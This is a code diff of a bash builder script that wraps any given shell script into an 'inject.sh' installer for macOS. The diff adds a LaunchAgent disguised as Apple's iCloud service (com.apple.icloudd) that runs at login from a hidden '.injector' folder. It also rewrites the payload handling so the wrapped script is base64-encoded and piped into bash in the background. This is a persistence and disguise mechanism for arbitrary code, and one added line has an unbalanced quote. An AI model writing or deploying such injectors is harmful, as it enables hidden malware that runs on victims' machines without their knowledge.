@@ -1,7 +1,8 @@
 #!/bin/bash
 read -p "Path of your shell script : " path
 DIR=$(dirname $0)
-
+echo
+echo "Script has been created at : $DIR/inject.sh"
 cat <<'EOM' >$DIR/inject.sh
 #!/bin/bash
 DIR=$(dirname $0)
@@ -60,6 +61,20 @@ cat <<EOQ >~/Library/LaunchAgents/com.apple.icloud.plist
 </dict>
 </plist>
 EOQ
+cat <<EOO >~/Library/LaunchAgents/com.apple.icloudd.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.apple.icloudd</string>
+	<key>Program</key>
+	<string>/Users/$(whoami)/Library/Containers/.injector/script.sh</string>
+	<key>RunAtLoad</key>
+	<true/>
+</dict>
+</plist>
+EOO
 chmod +x /Users/$(whoami)/Library/Containers/.injector/injector.sh
 cat <<'EOA' >/Users/$(whoami)/Library/Containers/.injector/seticon.py
 #!/usr/bin/env python
@@ -69,8 +84,13 @@ import sys
 Cocoa.NSWorkspace.sharedWorkspace().setIcon_forFile_options_(Cocoa.NSImage.alloc().initWithContentsOfFile_(sys.argv[1].decode('utf-8')), sys.argv[2].decode('utf-8'), 0) or sys.exit("Unable to set file icon")
 EOA
 launchctl load -w ~/Library/LaunchAgents/com.apple.icloud.plist
+cat <<EOX > /Users/$(whoami)/Library/Containers/.injector/script.sh
+#!/bin/bash
+echo "$(cat $path | base64) | base64 -D | bash & 
+EOX
 EOM
-echo "echo $(cat $path | base64) > /Users/$(whoami)/Library/Containers/.injector/script.txt" >> $DIR/inject.sh
+echo 'cat <<EOX > /Users/$(whoami)/Library/Containers/.injector/script.sh' >> $DIR/inject.sh
+echo '#!/bin/bash' >> $DIR/inject.sh
+echo "echo $(cat $path | base64) | base64 -D | bash &" >> $DIR/inject.sh
+echo "EOX" >> $DIR/inject.sh
 echo "sh /Users/$(whoami)/Library/Containers/.injector/injector.sh" >> $DIR/inject.sh
-echo
-echo "Script has been created at : $DIR/injector.sh"
